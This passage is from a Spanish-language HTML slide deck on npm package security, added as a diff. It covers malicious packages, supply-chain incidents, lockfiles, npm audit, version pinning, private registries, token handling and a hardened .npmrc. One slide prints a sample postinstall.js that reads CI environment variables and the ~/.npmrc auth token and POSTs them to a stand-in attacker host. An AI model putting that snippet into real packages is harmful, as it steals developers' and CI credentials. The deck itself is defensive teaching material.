+            <li><div class="box">▸</div><div><div class="txt">Reverse shells / beacons</div><div class="sub">Conexión saliente a infraestructura del atacante en <span class="mono">postinstall</span>.</div></div></li>
+            <li><div class="box">▸</div><div><div class="txt">Cryptominers</div><div class="sub">Uso silencioso de CPU del runner/desarrollador.</div></div></li>
+            <li><div class="box">▸</div><div><div class="txt">Wallet drainers</div><div class="sub">Búsqueda de seed phrases y claves privadas locales.</div></div></li>
+            <li><div class="box">▸</div><div><div class="txt">Protestware</div><div class="sub">Sabotaje politizado activado por geolocalización.</div></div></li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="stack-24">
+        <div class="term">
+          <div class="term-bar">
+            <div class="lights"><span></span><span></span><span></span></div>
+            <span>postinstall.js — patrón observado</span>
+          </div>
+<pre><span class="c-cmt">// Disparado por el hook "postinstall"</span>
+<span class="c-key">const</span> os = <span class="c-key">require</span>(<span class="c-str">'os'</span>);
+<span class="c-key">const</span> fs = <span class="c-key">require</span>(<span class="c-str">'fs'</span>);
+<span class="c-key">const</span> https = <span class="c-key">require</span>(<span class="c-str">'https'</span>);
+
+<span class="c-key">const</span> payload = {
+  user:   os.userInfo().username,
+  host:   os.hostname(),
+  env:    process.env,                <span class="c-bad">// ← tokens del CI</span>
+  npmrc:  fs.readFileSync(             <span class="c-bad">// ← _authToken</span>
+    <span class="c-str">`${os.homedir()}/.npmrc`</span>, <span class="c-str">'utf8'</span>),
+};
+
+https.request({
+  host: <span class="c-str">'logs.<span class="c-bad">attacker</span>.tld'</span>,
+  method: <span class="c-str">'POST'</span>,
+}).end(JSON.stringify(payload));</pre>
+        </div>
+        <p class="small">Patrón compuesto a partir de incidentes públicos. La ejecución ocurre antes de cualquier prueba o lint.</p>
+      </div>
+    </div>
+
+    <div class="footbar"><div>02 · Amenazas / Malicious Packages</div><div class="pageno">10 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 11 · SUPPLY CHAIN ==================== -->
+<section data-screen-label="11 Supply Chain">
+  <div class="frame dense">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>02 · amenazas</span><span class="active">// supply chain</span></div>
+      <div class="meta"><span>11 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div style="display:flex; gap: 12px; margin-bottom: 18px;">
+        <span class="tag danger">Compromiso ascendente</span>
+        <span class="tag neutral">Vector: paquete legítimo, mantenedor secuestrado</span>
+      </div>
+      <h2 class="h2" style="max-width: 22ch; font-size: 56px;">Supply Chain Attacks.</h2>
+      <p class="lead" style="margin-top: 14px; max-width: 50ch; font-size: 24px;">No publican un paquete nuevo — comprometen uno legítimo que tus dependencias ya usan.</p>
+    </div>
+
+    <div style="margin-top: 28px;" class="flow">
+      <div class="node">
+        <div class="ttl">01 · Acceso</div>
+        <div class="body-t">Mantenedor comprometido vía phishing, token filtrado o cuenta sin 2FA.</div>
+      </div>
+      <div class="arrow">›</div>
+      <div class="node">
+        <div class="ttl">02 · Publicación</div>
+        <div class="body-t">Nueva versión minor del paquete legítimo, con payload oculto u ofuscado.</div>
+      </div>
+      <div class="arrow">›</div>
+      <div class="node">
+        <div class="ttl">03 · Propagación</div>
+        <div class="body-t">Rangos <span class="mono">^</span>/<span class="mono">~</span> y CIs sin lockfile descargan la versión envenenada automáticamente.</div>
+      </div>
+    </div>
+
+    <div style="margin-top: 20px;" class="grid-2">
+      <div class="card">
+        <div class="kicker"><span class="num">×</span> Casos públicos de referencia</div>
+        <div class="timeline">
+          <div class="ev"><div class="when">2018</div><div class="what"><div class="name">event-stream</div><div class="desc">Mantenedor cedió control; nueva dependencia maliciosa apuntada a una wallet específica de criptomonedas.</div></div></div>
+          <div class="ev"><div class="when">2021</div><div class="what"><div class="name">ua-parser-js</div><div class="desc">Cuenta del mantenedor comprometida; versiones publicadas con cryptominer + ladrón de credenciales.</div></div></div>
+          <div class="ev"><div class="when">2022</div><div class="what"><div class="name">node-ipc</div><div class="desc">Protestware introducido por el propio mantenedor; sobrescribía archivos en sistemas con IP rusa/bielorrusa.</div></div></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="kicker"><span class="num">✓</span> Por qué es el más temido</div>
+        <p class="body" style="margin:0; font-size:18px;">El paquete <em>es</em> el legítimo — auditorías estáticas, comparación de nombres y firmas de mantenedor no lo detectan. Defensas válidas: <strong style="color:var(--fg);">lockfile estricto</strong>, <strong style="color:var(--fg);">pinning de versiones</strong> en producción, <strong style="color:var(--fg);">scanners que comparen integridad histórica</strong> y <strong style="color:var(--fg);">delay de adopción</strong> (no instalar versiones publicadas hace &lt; N días).</p>
+      </div>
+    </div>
+
+    <div class="footbar"><div>02 · Amenazas / Supply Chain</div><div class="pageno">11 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 12 · SECTION 3 DIVIDER ==================== -->
+<section data-screen-label="12 Sección 03">
+  <div class="divider">
+    <div class="left">
+      <div class="topbar"><div class="brand"><span class="dot"></span><span>pkg-sec</span></div><div></div></div>
+      <div>
+        <div class="eyebrow" style="margin-bottom: 20px;">Sección</div>
+        <div class="bignum">03</div>
+      </div>
+      <div class="mono-tag">06 slides</div>
+    </div>
+    <div class="right">
+      <div></div>
+      <div>
+        <h2 class="h2">Buenas prácticas<br/>de seguridad</h2>
+        <p class="body" style="margin-top: 24px; max-width: 40ch;">Controles que reducen drásticamente la superficie de ataque sin sacrificar la velocidad de desarrollo.</p>
+      </div>
+      <div class="mono-tag">Sec. 03 · Defensas</div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 13 · LOCKFILE ==================== -->
+<section data-screen-label="13 package-lock">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>03 · prácticas</span><span class="active">// lockfile</span></div>
+      <div class="meta"><span>13 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">03.1 · Reproducibilidad</div>
+      <h2 class="h2" style="max-width: 22ch;">Tratar <span class="mono" style="color:var(--accent);">package-lock.json</span> como código fuente.</h2>
+    </div>
+
+    <div style="margin-top: 44px;" class="grid-2">
+      <div class="stack-16">
+        <p class="body">El lockfile congela el árbol exacto: versión, URL y hash de cada paquete transitivo. Sin él, dos <span class="mono">npm install</span> en dos máquinas pueden traer árboles distintos — incluyendo versiones recién comprometidas.</p>
+
+        <ol class="numbered">
+          <li><div><div class="t">Versionarlo</div><div class="d">Commit en el repo, revisar diffs como cualquier código.</div></div></li>
+          <li><div><div class="t">CI = <span class="mono">npm ci</span>, nunca <span class="mono">npm install</span></div><div class="d">Instalación reproducible: falla si el lockfile no coincide con el manifiesto.</div></div></li>
+          <li><div><div class="t">Revisar diffs grandes</div><div class="d">Un cambio sospechoso en <span class="mono">resolved</span> o <span class="mono">integrity</span> es una bandera roja.</div></div></li>
+        </ol>
+      </div>
+
+      <div class="term">
+        <div class="term-bar">
+          <div class="lights"><span></span><span></span><span></span></div>
+          <span>package-lock.json (fragmento)</span>
+        </div>
+<pre>{
+  <span class="c-str">"name"</span>: <span class="c-str">"acme-api"</span>,
+  <span class="c-str">"lockfileVersion"</span>: 3,
+  <span class="c-str">"packages"</span>: {
+    <span class="c-str">"node_modules/express"</span>: {
+      <span class="c-str">"version"</span>:   <span class="c-str">"4.19.2"</span>,
+      <span class="c-str">"resolved"</span>:  <span class="c-str">"https://registry.npmjs.org/…</span>
+                   <span class="c-str">/express-4.19.2.tgz"</span>,
+      <span class="c-str">"integrity"</span>: <span class="c-str">"sha512-<span class="c-dim">a1b2c3…</span>"</span>
+    }
+  }
+}
+<span class="c-cmt">// resolved + integrity = fingerprint inmutable</span>
+<span class="c-cmt">// si cualquiera cambia, npm ci falla</span></pre>
+      </div>
+    </div>
+
+    <div class="footbar"><div>03 · Prácticas / Lockfile</div><div class="pageno">13 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 14 · NPM AUDIT ==================== -->
+<section data-screen-label="14 npm audit">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>03 · prácticas</span><span class="active">// auditorías</span></div>
+      <div class="meta"><span>14 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">03.2 · Detección continua</div>
+      <h2 class="h2" style="max-width: 24ch;"><span class="mono" style="color:var(--accent);">npm audit</span> y auditorías automatizadas.</h2>
+    </div>
+
+    <div style="margin-top: 44px;" class="grid-2">
+      <div class="term">
+        <div class="term-bar">
+          <div class="lights"><span></span><span></span><span></span></div>
+          <span>auditoría local + CI</span>
+        </div>
+<pre><span class="c-cmt"># reporte humano</span>
+$ <span class="c-key">npm</span> audit
+
+<span class="c-cmt"># falla el build si hay vulns altas</span>
+$ <span class="c-key">npm</span> audit --audit-level=<span class="c-str">high</span>
+
+<span class="c-cmt"># solo dependencias de producción</span>
+$ <span class="c-key">npm</span> audit --omit=<span class="c-str">dev</span>
+
+<span class="c-cmt"># reporte máquina (para SARIF, dashboards)</span>
+$ <span class="c-key">npm</span> audit --json &gt; audit.json
+
+<span class="c-cmt"># intentar arreglos automáticos (con cuidado)</span>
+$ <span class="c-key">npm</span> audit fix
+$ <span class="c-key">npm</span> audit fix --force      <span class="c-bad"># puede romper API</span></pre>
+      </div>
+
+      <div class="stack-16">
+        <p class="body">Hacerlo parte del pipeline, no del ritual humano.</p>
+        <ul class="checklist">
+          <li><div class="box">✓</div><div><div class="txt">Ejecutar en cada PR — falla el build a partir de <em>high</em>.</div><div class="sub">Distingue <span class="mono">--omit=dev</span> para no bloquear por vulns que no llegan a producción.</div></div></li>
+          <li><div class="box">✓</div><div><div class="txt">Complementar con un scanner externo (SCA).</div><div class="sub">Snyk, GitHub Dependabot, OSV-Scanner, Socket — distintos catálogos, distinta cobertura.</div></div></li>
+          <li><div class="box">✓</div><div><div class="txt">Política sobre <span class="mono">audit fix --force</span>.</div><div class="sub">Requiere tests verdes + revisión humana. Nunca automático en main.</div></div></li>
+          <li><div class="box">✓</div><div><div class="txt">SBOM mensual.</div><div class="sub">CycloneDX o SPDX para tener inventario auditable de qué corre en producción.</div></div></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="footbar"><div>03 · Prácticas / Auditoría</div><div class="pageno">14 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 15 · VERSIONING ==================== -->
+<section data-screen-label="15 Versionado">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>03 · prácticas</span><span class="active">// versionado</span></div>
+      <div class="meta"><span>15 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">03.3 · Rangos peligrosos</div>
+      <h2 class="h2" style="max-width: 24ch;">Versionado seguro: el rango es política.</h2>
+    </div>
+
+    <div style="margin-top: 40px;" class="grid-2">
+      <div class="card">
+        <div class="kicker"><span class="num">▸</span> Operadores y riesgo</div>
+        <dl class="kv">
+          <dt class="mono">"4.19.2"</dt><dd>Exacto. Reproducible. <span class="tag ok">seguro</span></dd>
+          <dt class="mono">"~4.19.2"</dt><dd>Patch only (4.19.x). <span class="tag">moderado</span></dd>
+          <dt class="mono">"^4.19.2"</dt><dd>Minor + patch (4.x.x). <span class="tag danger">amplio</span></dd>
+          <dt class="mono">"*" / "latest"</dt><dd>Cualquier versión. <span class="tag danger">prohibir</span></dd>
+          <dt class="mono">git/url</dt><dd>Fuera del registry. <span class="tag danger">auditar</span></dd>
+        </dl>
+      </div>
+
+      <div class="stack-24">
+        <div class="card">
+          <div class="kicker"><span class="num">✓</span> Recomendación operacional</div>
+          <p class="body" style="margin:0; font-size:19px;">Pinear exacto en <span class="mono">package.json</span> + actualizar deliberadamente vía Renovate/Dependabot. El lockfile da reproducibilidad, pero los rangos amplios siguen ampliando la superficie ante un compromiso ascendente.</p>
+        </div>
+        <div class="card">
+          <div class="kicker"><span class="num">⏱</span> Cooldown de versiones</div>
+          <p class="body" style="margin:0; font-size:19px;">Configurar el bot para esperar <strong style="color:var(--fg);">7–14 días</strong> antes de proponer una versión recién publicada. La mayoría de paquetes maliciosos se detectan y retiran en esa ventana.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="footbar"><div>03 · Prácticas / Versionado</div><div class="pageno">15 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 16 · MINIMIZE DEPS ==================== -->
+<section data-screen-label="16 Minimizar deps">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>03 · prácticas</span><span class="active">// minimalismo</span></div>
+      <div class="meta"><span>16 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">03.4 · Menos código, menos riesgo</div>
+      <h2 class="h2" style="max-width: 24ch;">Evitar dependencias innecesarias.</h2>
+    </div>
+
+    <div style="margin-top: 44px;" class="grid-2">
+      <div class="stack-24">
+        <p class="body">La dependencia más segura es la que no agregaste. Antes de instalar, pregúntate:</p>
+        <ol class="numbered">
+          <li><div><div class="t">¿La plataforma ya lo resuelve?</div><div class="d"><span class="mono">fetch</span>, <span class="mono">crypto</span>, <span class="mono">structuredClone</span>… Node moderno cubre mucho de lo que motivó utilidades antiguas.</div></div></li>
+          <li><div><div class="t">¿Es un one-liner disfrazado?</div><div class="d">Paquetes que aportan &lt; 20 líneas casi siempre se pueden copiar y mantener internamente.</div></div></li>
+          <li><div><div class="t">¿Cuánto pesa transitivamente?</div><div class="d">Una dependencia con 0 deps directas puede traer 50 indirectas — revisar con <span class="mono">npm ls</span>.</div></div></li>
+          <li><div><div class="t">¿Sigue mantenido?</div><div class="d">Último release, issues abiertas, número de mantenedores. Abandonado = vulnerable.</div></div></li>
+        </ol>
+      </div>
+
+      <div class="term">
+        <div class="term-bar">
+          <div class="lights"><span></span><span></span><span></span></div>
+          <span>higiene del manifiesto</span>
+        </div>
+<pre><span class="c-cmt"># ver árbol completo y peso</span>
+$ <span class="c-key">npm</span> ls --all
+$ <span class="c-key">npm</span> ls --depth=0
+
+<span class="c-cmt"># detectar deps no usadas</span>
+$ <span class="c-key">npx</span> depcheck
+
+<span class="c-cmt"># ver tamaño en disco real</span>
+$ <span class="c-key">du</span> -sh node_modules/
+
+<span class="c-cmt"># inspeccionar antes de instalar</span>
+$ <span class="c-key">npm</span> view &lt;pkg&gt; maintainers time versions
+$ <span class="c-key">npm</span> view &lt;pkg&gt; repository.url
+$ <span class="c-key">npx</span> npq install &lt;pkg&gt;   <span class="c-cmt"># scan previo</span></pre>
+      </div>
+    </div>
+
+    <div class="footbar"><div>03 · Prácticas / Minimalismo</div><div class="pageno">16 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 17 · PRIVATE REGISTRIES ==================== -->
+<section data-screen-label="17 Registries privados">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>03 · prácticas</span><span class="active">// registries privados</span></div>
+      <div class="meta"><span>17 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">03.5 · Proxy + control</div>
+      <h2 class="h2" style="max-width: 24ch;">Registries privados como cortafuegos.</h2>
+    </div>
+
+    <div style="margin-top: 44px;" class="grid-2">
+      <div class="stack-24">
+        <p class="body">Un registry privado (Verdaccio, Artifactory, Nexus, GitHub Packages, AWS CodeArtifact…) sirve para tres cosas:</p>
+        <ol class="numbered">
+          <li><div><div class="t">Alojar tus paquetes internos</div><div class="d">Aislados del público — bloquea el vector de dependency confusion si el scope se mapea bien.</div></div></li>
+          <li><div><div class="t">Hacer de caché del público</div><div class="d">Reproducibilidad incluso si un paquete público desaparece (left-pad doctrine).</div></div></li>
+          <li><div><div class="t">Filtrar lo que entra</div><div class="d">Allowlist/denylist, escaneo automático, bloqueo de versiones recién publicadas.</div></div></li>
+        </ol>
+      </div>
+
+      <div class="flow" style="grid-template-columns: 1fr auto 1fr auto 1fr; align-items:center;">
+        <div class="node">
+          <div class="ttl">Desarrollador / CI</div>
+          <div class="body-t"><span class="mono">npm install</span></div>
+        </div>
+        <div class="arrow">›</div>
+        <div class="node">
+          <div class="ttl">Registry privado</div>
+          <div class="body-t">Cache + políticas + scopes internos.</div>
+        </div>
+        <div class="arrow">›</div>
+        <div class="node">
+          <div class="ttl">Registry público</div>
+          <div class="body-t">Solo paquetes aprobados pasan.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="footbar"><div>03 · Prácticas / Registries</div><div class="pageno">17 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 18 · TOKENS ==================== -->
+<section data-screen-label="18 Tokens">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>03 · prácticas</span><span class="active">// tokens y credenciales</span></div>
+      <div class="meta"><span>18 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">03.6 · Identidad y secretos</div>
+      <h2 class="h2" style="max-width: 26ch;">Gestión de tokens y credenciales.</h2>
+    </div>
+
+    <div style="margin-top: 44px;" class="grid-2">
+      <div class="card">
+        <div class="kicker"><span class="num">▸</span> Principios</div>
+        <ul class="checklist">
+          <li><div class="box">✓</div><div><div class="txt">2FA obligatoria para mantenedores que publican.</div><div class="sub">Cuenta sin segundo factor = vector directo de supply chain.</div></div></li>
+          <li><div class="box">✓</div><div><div class="txt">Tokens granulares por scope y permiso.</div><div class="sub">Read-only para CI que solo consume; <em>publish</em> solo para el job que publica.</div></div></li>
+          <li><div class="box">✓</div><div><div class="txt">Expiración corta + rotación.</div><div class="sub">90 días máx., auditable; revocar al cambiar de proyecto o persona.</div></div></li>
+          <li><div class="box">✓</div><div><div class="txt">OIDC / Trusted Publishers cuando esté disponible.</div><div class="sub">Publicar sin tokens de larga duración — la federación de identidad del CI firma el release.</div></div></li>
+        </ul>
+      </div>
+
+      <div class="card" style="display:flex; flex-direction:column;">
+        <div class="kicker"><span class="num">×</span> Antipatrones que no deberíamos seguir viendo</div>
+        <div class="stack-12" style="margin-top: 4px;">
+          <div class="term" style="font-size: 15px;">
+            <div class="term-bar">
+              <div class="lights"><span></span><span></span><span></span></div>
+              <span>~/.npmrc — comiteado al repo</span>
+            </div>
+<pre><span class="c-cmt"># NO: token de larga vida hardcodeado</span>
+//registry.npmjs.org/:_authToken=<span class="c-bad">npm_AbCdEf123…</span>
+
+<span class="c-cmt"># NO: secreto exportado en script de package.json</span>
+<span class="c-str">"prepublish"</span>: <span class="c-str">"NPM_TOKEN=<span class="c-bad">npm_xxx</span> npm publish"</span>
+
+<span class="c-cmt"># NO: log del CI imprimiendo env</span>
+$ <span class="c-key">env</span>  <span class="c-bad">← secretos en stdout públicos</span></pre>
+          </div>
+          <p class="small">Lo correcto: secretos solo desde el secret store del CI, inyectados al runner, nunca comiteados, nunca logueados.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="footbar"><div>03 · Prácticas / Tokens</div><div class="pageno">18 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 19 · SECTION 4 DIVIDER ==================== -->
+<section data-screen-label="19 Sección 04">
+  <div class="divider">
+    <div class="left">
+      <div class="topbar"><div class="brand"><span class="dot"></span><span>pkg-sec</span></div><div></div></div>
+      <div>
+        <div class="eyebrow" style="margin-bottom: 20px;">Sección</div>
+        <div class="bignum">04</div>
+      </div>
+      <div class="mono-tag">05 slides</div>
+    </div>
+    <div class="right">
+      <div></div>
+      <div>
+        <h2 class="h2">El archivo <span class="mono" style="color:var(--accent);">.npmrc</span></h2>
+        <p class="body" style="margin-top: 24px; max-width: 40ch;">El centro de gravedad de la configuración de npm. Bien escrito, cierra simultáneamente dependency confusion, exfiltración de secretos y resoluciones inesperadas.</p>
+      </div>
+      <div class="mono-tag">Sec. 04 · .npmrc</div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 20 · WHAT IS NPMRC ==================== -->
+<section data-screen-label="20 Qué es .npmrc">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>04 · .npmrc</span><span class="active">// definición</span></div>
+      <div class="meta"><span>20 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">04.1 · Qué es</div>
+      <h2 class="h2" style="max-width: 24ch;">El archivo de configuración de npm.</h2>
+    </div>
+
+    <div style="margin-top: 48px;" class="grid-2">
+      <div class="stack-24">
+        <p class="body">
+          <span class="mono" style="color: var(--fg);">.npmrc</span> es un archivo plano (<span class="mono">key=value</span>) que define el comportamiento del CLI: qué registry usar, qué token enviar, qué scripts permitir, cómo cachear, qué política de versionado aplicar.
+        </p>
+        <p class="body">Existen cuatro niveles de configuración que se combinan en cascada — entenderlos es lo que separa una configuración segura de una accidental.</p>
+
+        <div class="card">
+          <div class="kicker"><span class="num">!</span> Idea clave</div>
+          <p class="body" style="margin:0; font-size:19px;">Todo lo que <span class="mono">npm install</span> hace silenciosamente — adónde habla, qué credenciales envía, qué ejecuta — está controlado por <span class="mono">.npmrc</span>. Es la primera línea de defensa configurable.</p>
+        </div>
+      </div>
+
+      <div class="term">
+        <div class="term-bar">
+          <div class="lights"><span></span><span></span><span></span></div>
+          <span>.npmrc — ejemplo mínimo</span>
+        </div>
+<pre><span class="c-cmt"># registry por defecto</span>
+<span class="c-key">registry</span>=https://registry.npmjs.org/
+
+<span class="c-cmt"># un scope apuntando a registry interno</span>
+<span class="c-key">@acme:registry</span>=https://npm.acme.internal/
+
+<span class="c-cmt"># autenticación referenciada por variable</span>
+//npm.acme.internal/:_authToken=${<span class="c-var">ACME_NPM_TOKEN</span>}
+
+<span class="c-cmt"># comportamiento</span>
+<span class="c-key">save-exact</span>=true
+<span class="c-key">ignore-scripts</span>=true
+<span class="c-key">audit-level</span>=high</pre>
+      </div>
+    </div>
+
+    <div class="footbar"><div>04 · .npmrc / Definición</div><div class="pageno">20 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 21 · LOCATIONS ==================== -->
+<section data-screen-label="21 Ubicaciones">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>04 · .npmrc</span><span class="active">// ubicaciones · prioridad</span></div>
+      <div class="meta"><span>21 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">04.2 · Dónde vive</div>
+      <h2 class="h2" style="max-width: 26ch;">Cuatro niveles, una sola cascada.</h2>
+    </div>
+
+    <div style="margin-top: 40px;" class="grid-2">
+      <div class="card">
+        <div class="kicker"><span class="num">▸</span> Niveles, de mayor a menor prioridad</div>
+        <ol class="numbered">
+          <li><div><div class="t">Proyecto · <span class="mono">./.npmrc</span></div><div class="d">En la raíz del repo. Compartida con el equipo. <strong>Nunca</strong> debería contener secretos.</div></div></li>
+          <li><div><div class="t">Usuario · <span class="mono">~/.npmrc</span></div><div class="d">Personal del desarrollador. Aquí sí pueden vivir tokens de larga duración locales.</div></div></li>
+          <li><div><div class="t">Global · <span class="mono">$PREFIX/etc/npmrc</span></div><div class="d">A nivel de la instalación de Node; aplica a todos los usuarios del sistema.</div></div></li>
+          <li><div><div class="t">Built-in · npm interno</div><div class="d">Defaults del propio CLI. Es lo único que aplica si no hay nada definido arriba.</div></div></li>
+        </ol>
+      </div>
+
+      <div class="stack-24">
+        <div class="term">
+          <div class="term-bar">
+            <div class="lights"><span></span><span></span><span></span></div>
+            <span>cómo npm resuelve la configuración</span>
+          </div>
+<pre>          ┌────────────────────────────┐
+   alta   │  CLI flags (--registry…)   │
+    ↑     ├────────────────────────────┤
+    │     │  env vars  (NPM_CONFIG_*)  │
+    │     ├────────────────────────────┤
+    │     │  ./.npmrc       (proyecto) │
+    │     ├────────────────────────────┤
+    │     │  ~/.npmrc       (usuario)  │
+    │     ├────────────────────────────┤
+    │     │  $PREFIX/etc/npmrc (global)│
+    │     ├────────────────────────────┤
+   baja   │  built-in defaults         │
+          └────────────────────────────┘
+<span class="c-cmt"># ver qué valor está ganando, y de dónde:</span>
+$ <span class="c-key">npm</span> config get registry
+$ <span class="c-key">npm</span> config list -l</pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="footbar"><div>04 · .npmrc / Ubicaciones</div><div class="pageno">21 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 22 · VARIABLES ==================== -->
+<section data-screen-label="22 Variables">
+  <div class="frame">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>04 · .npmrc</span><span class="active">// variables soportadas</span></div>
+      <div class="meta"><span>22 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 40px;">
+      <div class="eyebrow" style="margin-bottom: 18px;">04.3 · Variables que importan en seguridad</div>
+      <h2 class="h2" style="max-width: 26ch;">Las claves que merecen una decisión consciente.</h2>
+    </div>
+
+    <div style="margin-top: 40px;" class="grid-2">
+      <div class="card">
+        <div class="kicker"><span class="num">▸</span> Resolución y red</div>
+        <dl class="kv">
+          <dt class="mono">registry</dt><dd>URL por defecto para resolver paquetes.</dd>
+          <dt class="mono">@scope:registry</dt><dd>Override por scope — clave contra <em>dependency confusion</em>.</dd>
+          <dt class="mono">always-auth</dt><dd>Forzar envío del token incluso para GETs.</dd>
+          <dt class="mono">strict-ssl</dt><dd>Rechazar certificados inválidos — siempre <span class="mono">true</span>.</dd>
+          <dt class="mono">prefer-offline</dt><dd>Usar caché local si existe — útil en CI estables.</dd>
+        </dl>
+      </div>
+      <div class="card">
+        <div class="kicker"><span class="num">▸</span> Comportamiento y seguridad</div>
+        <dl class="kv">
+          <dt class="mono">ignore-scripts</dt><dd>No ejecutar hooks <span class="mono">pre/post-install</span>. Default en CI.</dd>
+          <dt class="mono">audit</dt><dd>Habilitar/deshabilitar audit automático.</dd>
+          <dt class="mono">audit-level</dt><dd>Umbral mínimo para fallar (<span class="mono">low|moderate|high|critical</span>).</dd>
+          <dt class="mono">save-exact</dt><dd>Pinear exacto al instalar (sin <span class="mono">^</span>).</dd>
+          <dt class="mono">engine-strict</dt><dd>Forzar versión de Node declarada en <span class="mono">package.json</span>.</dd>
+          <dt class="mono">fund / update-notifier</dt><dd>Ruido — desactivar en CI.</dd>
+        </dl>
+      </div>
+    </div>
+
+    <div class="footbar"><div>04 · .npmrc / Variables</div><div class="pageno">22 / 27</div></div>
+  </div>
+</section>
+
+<!-- ==================== 23 · COMMENTED EXAMPLE ==================== -->
+<section data-screen-label="23 Ejemplo .npmrc">
+  <div class="frame dense">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span><span>pkg-sec</span></div>
+      <div class="crumbs"><span>04 · .npmrc</span><span class="active">// ejemplo comentado</span></div>
+      <div class="meta"><span>23 / 27</span></div>
+    </div>
+
+    <div style="margin-top: 24px;">
+      <div class="eyebrow" style="margin-bottom: 14px;">04.4 · Plantilla recomendada</div>
+      <h3 class="h3" style="max-width: 32ch;"><span class="mono" style="color:var(--accent);">.npmrc</span> endurecido — explicado línea por línea.</h3>
+    </div>
+
+    <div style="margin-top: 20px; display:grid; grid-template-columns: 1.15fr 1fr; gap: 24px; flex: 1; min-height: 0;">
+      <div class="term" style="font-size: 13.5px; line-height: 1.5;">
+        <div class="term-bar">
+          <div class="lights"><span></span><span></span><span></span></div>
+          <span>./.npmrc — versionado en el repo</span>
+        </div>
+<pre><span class="c-cmt"># ── 1. Registries ────────────────────────────</span>
+<span class="c-key">registry</span>=https://npm.acme.internal/repository/proxy/
+
+<span class="c-cmt"># Scope interno: nunca debe ir al público.</span>
+<span class="c-key">@acme:registry</span>=https://npm.acme.internal/repository/private/
+<span class="c-key">@acme:always-auth</span>=true
+
+<span class="c-cmt"># ── 2. Autenticación (vía env, jamás hardcoded) ─</span>
+//npm.acme.internal/:_authToken=${<span class="c-var">ACME_NPM_TOKEN</span>}
+
+<span class="c-cmt"># ── 3. Seguridad de red ──────────────────────</span>
+<span class="c-key">strict-ssl</span>=true
+<span class="c-key">fetch-retries</span>=3
+<span class="c-key">fetch-retry-mintimeout</span>=10000
+
+<span class="c-cmt"># ── 4. Comportamiento de instalación ─────────</span>
+<span class="c-key">ignore-scripts</span>=true            <span class="c-cmt"># bloquear pre/post-install</span>
+<span class="c-key">save-exact</span>=true                <span class="c-cmt"># pinear versiones exactas</span>
+<span class="c-key">engine-strict</span>=true             <span class="c-cmt"># exigir Node declarado</span>
+<span class="c-key">package-lock</span>=true              <span class="c-cmt"># mantener lockfile</span>
+
+<span class="c-cmt"># ── 5. Auditoría ─────────────────────────────</span>
+<span class="c-key">audit</span>=true
+<span class="c-key">audit-level</span>=high               <span class="c-cmt"># falla CI si ≥ high</span>
+
+<span class="c-cmt"># ── 6. Ruido fuera ───────────────────────────</span>
+<span class="c-key">fund</span>=false
+<span class="c-key">update-notifier</span>=false</pre>
+      </div>
+
+      <div class="stack-16">
+        <div class="card" style="padding: 18px 22px;">
+          <div class="kicker" style="margin-bottom: 8px;"><span class="num">1</span> Registries</div>
+          <p class="small" style="color: var(--fg-2); margin: 0;">El default va al proxy corporativo (cache + escaneo). El scope interno apunta a un repo privado distinto — esto cierra <em>dependency confusion</em>.</p>
+        </div>
+        <div class="card" style="padding: 18px 22px;">
